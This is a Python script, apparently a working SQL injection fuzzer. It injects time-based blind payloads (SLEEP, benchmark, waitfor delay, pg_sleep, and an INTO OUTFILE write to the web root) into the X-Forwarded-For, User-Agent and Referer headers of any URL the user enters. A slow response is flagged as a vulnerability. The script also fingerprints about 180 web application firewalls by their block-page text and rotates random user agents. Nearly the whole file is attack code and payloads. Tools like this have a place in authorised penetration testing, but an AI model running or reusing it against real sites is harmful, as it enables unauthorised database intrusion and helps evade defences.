import requests
from time import *
from fake_useragent import UserAgent
from colorama import Fore, Style, init
from random import randint, choice
import string

letters = string.ascii_lowercase


def r_time():
    # Случайное время
    return randint(0, int(strftime('%m%d')))


def r_string(n):
    # Случайные буквы
    return "".join([choice(letters.lower()+letters.upper()) for _ in range(0, int(n))])


init()
print(Style.BRIGHT)


def sqli_header_fuzz():
    def waf_detect(page_source):

        waflist = {
            '360': 'Sorry! Your access has been intercepted because your links may threaten website security.',
            'aeSecure': 'aesecure_denied.png',
            'Airlock1': 'Server detected a syntax error in your request',
            'Airlock2': 'Check your request and all parameters',
            'AlertLogic1': 'We are sorry, but the page you are looking for cannot be found',
            'AlertLogic2': 'The page has either been removed, renamed or temporarily unavailable',
            'Aliyundun': 'Sorry, your request has been blocked as it may cause potential threats to the server\'s '
                         'security',
            'Anquanbao1': '/aqb_cc/error/',
            'Anquanbao2': 'hidden_intercept_time',
            'Anyu1': 'Sorry! your access has been intercepted by AnYu',
            'Anyu2': 'AnYu- the green channel',
            'Approach1': 'Approach Web Application Firewall Framewor',
            'Approach2': 'Your IP address has been logged and this information could be used by '
                         'authorities to track you',
            'Approach3': 'Approach infrastructure team',
            'Armor Defense1': 'This request has been blocked by website protection from Armor',
            'Armor Defense2': 'If you manage this domain please create an Armor support ticket',
            'ASP.NET Generic': 'This generic 403 error means that the authenticated user is not authorized to '
                               'use the requested resource',
            'Astra': 'our website protection system has detected an issue with your IP address and wont let you '
                     'proceed any further',
            'Barracuda1': 'You are unable to access this website',
            'Barracuda2': 'You have been blocked',
            'Bekchy': 'Bekchy - Access Denied.',
            'BitNinja1': 'Security check by BitNinja',
            'BitNinja2': 'your IP will be removed from BitNinja',
            'BitNinja3': 'Visitor anti-robot validation',
            'BitNinja4': '(You will be challenged by a reCAPTCHA page)',
            'Bluedon IST': 'Bluedon Web Application Firewal',
            'BulletProof Security Pro': 'If you arrived here due to a search or clicking on a link click '
                                        'your Browser\'s back button to return to the previous page.',
            'CDN NS Application Gateway': 'CdnNsWAF Application Gateway',
            'Cerber (WordPress)1': 'We\'re sorry, you are not allowed to proceed',
            'Cerber (WordPress)2': 'Your request looks suspicious or similar to automated requests '
                                   'from spam posting software',
            'Cloudbric1': 'Malicious Code Detected',
            'Cloudbric2': 'Your request was blocked by Cloudbric',
            'Cloudflare3': 'Attention Required!',
            'Cloudflare4': 'DDoS protection by Cloudflare',
            'CloudfloorDNS': 'CloudfloorDNS - Web Application Firewall Error',
            'Cloudfront': 'Generated by cloudfront (CloudFront)',
            'CrawlProtect': 'This site is protected by CrawlProtect !!!',
            'Distil Web Protection1': 'Pardon Our Interruption...',
            'Distil Web Protection2': 'You have disabled javascript in your browser',
            'Distil Web Protection3': 'Something about your browser made us think that you are a bot',
            'DotDefender': 'dotDefender Blocked Your Request',
            'EdgeCast (Verizon)': 'Please contact the site administrator, and provide the following '
                                  'Reference ID:EdgeCast Web Application Firewall (Verizon)',
            'Eisoo Cloud1': '/eisoo-firewall-block.css',
            'Eisoo Cloud2': '© (year) Eisoo Inc',
            'F5 ASM': 'The requested URL was rejected. Please consult with your administrator',
            'FortiWeb1': 'Server unavailable. Please visit later',
            'FortiWeb2': 'Server unavailable',
            'GoDaddy': 'Access Denied - GoDaddy Website Firewall',
            'GreyWizard1': 'Grey Wizard',
            'GreyWizard2': 'Contact the website owner or Grey Wizard',
            'GreyWizard3': 'We\'ve detected attempted attack or non standard traffic from your IP address',
            'Huawei Cloud1': 'account.hwclouds.com/static/error/images/404img.jpg',
            'Huawei Cloud2': 'www.hwclouds.com',
            'Huawei Cloud3': 'hws_security@',
            'Imperva Incapsula1': 'Powered By Incapsula',
            'Imperva Incapsula2': 'subject=WAF Block Page',
            'Imperva Incapsula3': 'Incapsula incident ID',
            'Imperva Incapsula4': '_Incapsula_Resource',
            'Immunify3601': 'Powered by Imunify360',
            'Immunify3602': 'imunify360 preloader',
            'Immunify3603': 'protected by Imunify360',
            'IndusGuard': 'further investigation and remediation with a screenshot of this page',
            'Instart DX': 'The requested URL was rejected. Please consult with your administrator',
            'ISA Server1': 'The ISA Server denied the specified Uniform Resource Locator (URL)',
            'ISA Server2': 'The server denied the specified Uniform Resource Locator (URL). Contact the '
                           'server administrator',
            'Janusec Application Gateway': 'Janusec Application Gateway',
            'Jiasule': ' static.jiasule.com/static/js/http_error.js',
            'KnownSec': 'ks-waf-error.png',
            'LiteSpeed1': 'Proudly powered by LiteSpeed Web Server',
            'LiteSpeed2': 'Access to resource on this server is denied',
            'LiteSpeed3': 'http://www.litespeedtech.com/error-page',
            'Malcare1': 'Blocked because of Malicious Activities',
            'Malcare2': 'Firewall powered by MalCare',
            'ModSecurity1': 'This error was generated by Mod_Security',
            'ModSecurity2': 'One or more things in your request were suspicious',
            'ModSecurity3': 'rules of the mod_security module',
            'ModSecurity4': 'mod_security rules triggered',
            'ModSecurity5': '/modsecurity-errorpage/',
            'NAXSI': 'This Request Has Been Blocked By NAXSI',
            'Nemesida': 'Suspicious activity detected. Access to the site is blocked',
            'NewDefend': 'http://www.newdefend.com/feedback/misinformation/',
            'Nexusguard': 'speresources.nexusguard.com/wafpage/index.html',
            'NinjaFirewall1': 'NinjaFirewall: 403 Forbidden',
            'NinjaFirewall2': 'For security reasons, it was blocked and logged',
            'NinjaFirewall3': 'NinjaFirewall',
            'onMessage Shield1': 'Blackbaud K-12 conducts routine maintenance',
            'onMessage Shield2': 'This site is protected by an enhanced security system',
            'onMessage Shield3': 'https://status.blackbaud.com',
            'OpenResty Lua WAF': 'openresty',
            'Palo Alto1': 'Virus/Spyware Download Blocked',
            'Palo Alto2': 'Palo Alto Next Generation Security Platform',
            'PentaWAF': 'PentaWAF',
            'PerimeterX': 'https://www.perimeterx.com/whywasiblocked',
            'pkSecurityModule IDS1': 'pkSecurityModule: Security.Alert',
            'pkSecurityModule IDS2': 'A safety critical request was discovered and blocked',
            'Proventia (IBM)': 'request does not match Proventia rules',
            'Radware Appwall1': 'Unauthorized Activity Has Been Detected',
            'Radware Appwall2': 'Unauthorized Request Blocked',
            'Reblaze1': 'For further information, do not hesitate to contact us',
            'Reblaze2': 'Current session has been terminated',
            'Request Validation Mode1': 'ASP.NET has detected data in the request that is potentially dangerous',
            'Request Validation Mode2': 'Request Validation has detected a potentially dangerous client input value',
            'RSFirewall1': 'COM_RSFIREWALL_403_FORBIDDEN',
            'RSFirewall2': 'COM_RSFIREWALL_EVENT',
            'Sabre1': 'Your request has been blocked',
            'Sabre2': 'dxsupport@sabre.com',
            'Sabre3': 'clicking the above email link will automatically add some important details to the email '
                      'for us to investigate the problem',
            'Safe3': 'Safe3waf',
            'SafeDog': 'WAF/2.0',
            'SecuPress1': 'SecuPress',
            'SecuPress2': 'Block ID: Bad URL Contents',
            'SecureIIS3': 'Download SecureIIS Personal Edition',
            'SecureIIS4': 'http://www.eeye.com/SecureIIS/',
            'SecureSphere': 'Contact support for additional information',
            'SEnginx': 'SENGINX-ROBOT-MITIGATION',
            'Shadow Daemon': 'request forbidden by administrative rules',
            'ShieldSecurity1': 'You were blocked by the Shield',
            'ShieldSecurity2': 'Seriously stop repeating what you are doing or you will be locked out',
            'SiteGround': 'The page you are trying to access is restricted due to a security rule',
            'SiteGuard (JP Secure)1': 'Powered by SiteGuard',
            'SiteGuard (JP Secure)2': 'The server refuse to browse the page',
            'SiteLock TrueShield': 'Sitelock is leader in Business Website Security Services',
            'SonicWall1': 'Web Site Blocked',
            'SonicWall2': 'This request is blocked by the SonicWALL',
            'Sophos UTM': 'Powered by UTM Web Protection',
            'SquidProxy IDS': 'Access control configuration prevents your request from being allowed at this time',
            'StackPath': 'You performed an action that triggered the service and blocked your request',
            'Sucuri CloudProxy1': 'Access Denied - Sucuri Website Firewall',
            'Sucuri CloudProxy2': 'https://sucuri.net/privacy-policy',
            'Synology Cloud': 'Blocked response page has Copyright (c) 2019 Synology Inc. All rights reserved',
            'Tencent Cloud': 'waf.tencent-cloud.com',
            'UCloud UEWaf': '/uewaf_deny_pages/default/img/',
            'URLMaster SecurityCheck': 'SecurityCheck',
            'URLScan1': 'Rejected-by-URLScan',
            'URLScan2': 'Server Erro in Application',
            'URLScan3': 'Module: IIS Web Core',
            'Varnish (OWASP)': 'Request rejected by xVarnish-WAF',
            'Varnish CacheWall1': 'Error 403 Naughty, not Nice!',
            'Varnish CacheWall2': 'Varnish cache server',
            'Viettel1': 'Access denied · Viettel WAF',
            'Viettel2': 'https://cloudrity.com.vn/',
            'Viettel3': 'Viettel WAF system',
            'VirusDie1': 'http://cdn.virusdie.ru/splash/firewallstop.png',
            'VirusDie2': 'Virusdie',
            'WatchGuard IPS1': 'Request denied by WatchGuard Firewall',
            'WatchGuard IPS2': 'WatchGuard Technologies Inc',
            'WebARX Security1': 'This request has been blocked by WebARX Web Application Firewall',
            'WebARX Security2': '/wp-content/plugins/webarx/',
            'WebKnight': 'WebKnight Application Firewall AlertLogic',
            'WebSEAL1': 'This is a WebSEAL error message template file',
            'WebSEAL2': 'WebSEAL server received an invalid HTTP request',
            'WebTotem': 'The current request was blocked by WebTotem',
            'Wordfence1': 'Generated by Wordfence',
            'Wordfence2': 'A potentially unsafe operation has been detected in your request to this site',
            'Wordfence3': 'Your access to this site has been limited',
            'Wordfence4': 'This response was generated by Wordfence',
            'WTS-WAF': 'WTS-WAF',
            'Xuanwudun WAF': ' http://admin.dbappwaf.cn/index.php/Admin/ClientMisinform/',
            'Yunaq Chuangyu': 'http://help.365cyd.com/cyd-error-help.html?code=403',
            'Yundun': 'Blocked by YUNDUN Cloud WAF',
            'Yunsuo': 'yunsuologo',
            'ZenEdge': '/__zenedge/assets/',
            'ZScaler1': 'Access Denied: Accenture Policy',
            'ZScaler2': 'Your organization has selected Zscaler to protect you from internet threats',
            'ZScaler3': 'The Internet site you have attempted to access is prohibited. Accenture\'s webfilters '
                        'indicate that the site likely contains content considered inappropriate',
        }

        for waf_name, waf_sign in waflist.items():
            if waf_sign in page_source:
                print(
                    '[' + Fore.RED + 'WARNING' + Fore.RESET + '] WAF detected : ' + Fore.YELLOW + waf_name +
                    Fore.RESET + ' | WAF sign <' + Fore.YELLOW + waf_sign + Fore.RESET + '>')

    # Получаем текущее время
    def time_now():
        time__now = time()
        return time__now

    # Позволяет ожидать HTTP-запрос
    def wait(delay):
        sleep(delay)

    # GET
    def get_fuzzing(url, options, payload, r_delay):

        vuln = False
        # Юзер агент по умолчанию во время фаззинга
        user_agent = UserAgent(cache=False)

        headers = requests.utils.default_headers()
        headers.update(
            {
                'User-Agent': user_agent.random
            })

        if options == '1':

            headers = {'X-Forwarded-For': payload, 'User-Agent': user_agent.random}
            header = 'X-Forwarded-For'

        elif options == '2':

            headers = {'User-Agent': payload}
            header = 'User-Agent'

        else:

            headers = {'Referer': payload, 'User-Agent': user_agent.random}
            header = 'Referer'

        t1 = time_now()  # Получение текущего времени
        response = requests.get(url, headers=headers)  # Подключение к URL
        t2 = time_now()

        if r_delay != 0:  # Если r_delay отличается от 0, то мы добавляем задержку
            wait(r_delay)

        page_source = str(response.text)  # Ответ в формате кода странницы
        code = str(response.status_code)  # Статус код ответа
        resp_time = round(t2 - t1)  # Время ответа на запрос

        waf_detect(page_source)  # Проверяем, есть ли фингерпринт WAF в коде странницы

        if resp_time >= 3:
            print(
                '[' + Fore.BLUE + 'TRYING' + Fore.RESET + '] [' + Fore.YELLOW + code + Fore.RESET + '] ' +
                Fore.YELLOW + header + Fore.RESET + ' : ' + Fore.GREEN + payload + Fore.RESET + ' (' + Fore.GREEN + str(
                    resp_time) + Fore.RESET + 's)')
            vuln = True
        else:
            print(
                '[' + Fore.BLUE + 'TRYING' + Fore.RESET + '] [' + Fore.YELLOW + code + Fore.RESET + '] ' +
                Fore.YELLOW + header + Fore.RESET + ' : ' + Fore.RED + payload + Fore.RESET + ' (' + Fore.RED + str(
                    resp_time) + Fore.RESET + 's)')

        return vuln

    # POST
    def post_fuzzing(url, query, options, payload, r_delay):

        vuln = False
        # Юзер агент по умолчанию во время фаззинга
        user_agent = UserAgent(cache=False)

        headers = requests.utils.default_headers()
        headers.update(
            {
                'User-Agent': user_agent.random
            })

        if options == '1':

            headers = {'X-Forwarded-For': payload, 'User-Agent': user_agent.random}
            header = 'X-Forwarded-For'

        elif options == '2':

            headers = {'User-Agent': payload}
            header = 'User-Agent'

        else:

            headers = {'Referer': payload, 'User-Agent': user_agent.random}
            header = 'Referer'

        t1 = time_now()
        reponse = requests.post(url, data=query, headers=headers)
        t2 = time_now()

        if r_delay != 0:
            wait(r_delay)

        page_source = str(reponse.text)
        code = str(reponse.status_code)
        resp_time = round(t2 - t1)

        waf_detect(page_source)

        if resp_time >= 3:
            print(
                '[' + Fore.BLUE + 'TRYING' + Fore.RESET + '] [' + Fore.YELLOW + code + Fore.RESET + '] ' + Fore.YELLOW
                + header + Fore.RESET + ' : ' + Fore.GREEN + payload + Fore.RESET + ' (' + Fore.GREEN + str(
                    resp_time) + Fore.RESET + 's)')
            vuln = True
        else:
            print(
                '[' + Fore.BLUE + 'TRYING' + Fore.RESET + '] [' + Fore.YELLOW + code + Fore.RESET + '] ' +
                Fore.YELLOW + header + Fore.RESET + ' : ' + Fore.RED + payload + Fore.RESET + ' (' + Fore.RED + str(
                    resp_time) + Fore.RESET + 's)')

        return vuln

    def fuzz():

        payload = [

            "' OR SLEEP(3)#",
            "' OR SLEEP(3)--+",
            "' OR SLEEP(3)-- -",
            "' OR benchmark(30000000,MD5(7))#",
            "' OR benchmark(30000000,MD5(7))--+",
            "' OR benchmark(30000000,MD5(7))-- -",
            "NULL',(SELECT SLEEP(3)))#",
            "NULL',(SELECT SLEEP(3)))--+",
            "NULL',(SELECT SLEEP(3)))-- -",
            "NULL',(SELECT benchmark(30000000,MD5(7))))#",
            "NULL',(SELECT benchmark(30000000,MD5(7))))--+",
            "NULL',(SELECT benchmark(30000000,MD5(7))))-- -",
            "NULL','NULL',(SELECT SLEEP(3)))#",
            "NULL','NULL',(SELECT SLEEP(3)))--+",
            "NULL','NULL',(SELECT SLEEP(3)))-- -",
            "NULL','NULL',(SELECT benchmark(30000000,MD5(7))))#",
            "NULL','NULL',(SELECT benchmark(30000000,MD5(7))))--+",
            "NULL','NULL',(SELECT benchmark(30000000,MD5(7))))-- -",
            "+AND + SLEEP(10) - -",
            "/**/AND/**/SLEEP(10)/**/--",
            "'+AND+(IF((substring((SELECT+DATABASE()),1,1))+=+'d',+SLEEP(5),+0))--+",
            "/**/AND/**/(IF((substring((SELECT/**/DATABASE()),1,1))/**/=/**/'a',/**/SLEEP(0.5),/**/0))/**/--",
            "'+(select*from(select(sleep(10)))a)+'",
            "'+AND+(SELECT+9950+FROM+(SELECT(SLEEP(10)))obCp)--+",
            "'; waitfor delay '0:0:3' --",
            "AND %s=%s" % (r_time(), r_time()),
            "OR %s=%s" % (r_time(), r_time()),
            ") AND %s=%s" % (r_time(), r_time()),
            ")) AND %s=%s" % (r_time(), r_time()),
            "))) AND %s=%s" % (r_time(), r_time()),
            ") OR %s=%s" % (r_time(), r_time()),
            ")) OR %s=%s" % (r_time(), r_time()),
            "))) OR %s=%s" % (r_time(), r_time()),
            "sleep(%s)#" % (r_time()),
            "\" or sleep(%s)#" % (r_time()),
            "\' or sleep(%s)#" % (r_time()),
            "\' or sleep(%s)=\'" % (r_time()),
            "1) or sleep(%s)#" % (r_time()),
            "\')) or sleep(%s)=\'" % (r_time()),
            ";waitfor delay \'0:0:%s\'--" % (r_time()),
            "\"));waitfor delay \'0:0:%s\'--" % (r_time()),
            "1 or benchmark(10000000,MD5(1))#",
            "')) or benchmark(10000000,MD5(1))#",
            "\')) or pg_sleep(%s)--" % (r_time()),
            ") AND %s=%s AND (%s=%s" % (r_time(), r_time(), r_time(), r_time()),
            ") AND %s=%s AND (8533=8533" % (r_time(), r_time()),
            "\') AND %s=%s AND (\'%s\'=\'%s" % (r_time(), r_time(), r_string(5), r_string(5)),
            "\' OR NOT %s=%s-- %s" % (r_time(), r_time(), r_string(5)),
            "\' OR NOT %s=   %s-- %s" % (r_time(), r_time(), r_string(5)),
            "\' OR NOT (%s)=%s-- %s" % (r_time(), r_time(), r_string(5)),
            "' OR 1=1 INTO OUTFILE ' / var / www / file.php' --",
        ]

        print(Fore.RESET + '{~} SELECT A HEADER OPTIONS {~}' + Fore.RESET)
        print(Fore.RESET + r'''
 [1] X-Forwarded-For
 
 [2] User-Agent
 
 [3] Referer
        
 [4] All
''')

        options = input('[OPTION] ==> ')

        while options != '1' and options != '2' and options != '3' and options != '4':  # Проверка вариантов
            print(Fore.RED + '[!] Invalid options' + Fore.RESET)
            options = input('[OPTION] ==> ')

        print('\n')

        method = input('[?] [G]et Method or [P]ost: ')  # Спрашиваем, какой метод следует использовать

        while method != 'G' and method != 'g' and method != 'P' and method != 'p':  # Проверка метода
            print(Fore.RED + '[!] Invalid options' + Fore.RESET)
            method = input('[?] [G]et Method or [P]ost: ')

        # Фаззинг используя GET
        if method == 'G' or method == 'g':

            url = input('[?] Enter URL: ')

            # Спрашиваем, нужно ли нам добавлять время задержки между каждым HTTP-запросом
            delay_choice = input('[?] Do you want add delay between each HTTP request (default=0)? (y/n)  : ')

            r_delay = 0

            if delay_choice == 'y' or delay_choice == 'Y':
                r_delay = int(input('[?] Time delay in seconds: '))  # Время в секундах между задержками

            print('\n')

            if options == '4':  # Фаззинг для всех заголовков HTTP

                print(Fore.YELLOW + '[+] Fuzzing all header value' + Fore.RESET)
                print('\n')

                for p in payload:
                    get_fuzzing(url, '1', p, r_delay)
                print('\n')
                for p in payload:
                    get_fuzzing(url, '2', p, r_delay)
                print('\n')
                for p in payload:
                    get_fuzzing(url, '3', p, r_delay)
                print('\n')

            else:

                for p in payload:
                    get_fuzzing(url, options, p, r_delay)

        else:

            url = input('[?] Enter URL: ')

            query = {}

            num = int(input('[?] How many variable do you want add: '))

            i = 0

            while i < num:
                para = input('[?] Query parameter: ')  # Получение параметра
                value = input('[?] Value of parameter: ')  # Значение параметра
                query[para] = value

                i += 1

            print('[+] Adding POST data ', query)

            delay_choice = input('[?] Do you want add delay between each HTTP request (default=0)? (y/n): ')

            r_delay = 0

            if delay_choice == 'y' or delay_choice == 'Y':
                r_delay = int(input('[?] Time delay in seconds: '))

            print('\n')

            if options == '4':

                print(Fore.YELLOW + '[+] Fuzzing all header value' + Fore.RESET)
                print('\n')

                for p in payload:
                    post_fuzzing(url, query, '1', p, r_delay)
                print('\n')
                for p in payload:
                    post_fuzzing(url, query, '2', p, r_delay)
                print('\n')
                for p in payload:
                    post_fuzzing(url, query, '3', p, r_delay)
                print('\n')

            else:

                for p in payload:
                    post_fuzzing(url, query, options, p, r_delay)

        print('\n')
        continue_fuzz = input('[?] Do you want continue fuzzing? (y/n): ')

        if continue_fuzz == 'y' or continue_fuzz == 'Y':
            fuzz()
        else:
            print('\n')
            print('Bye-bye')
            exit()

    fuzz()
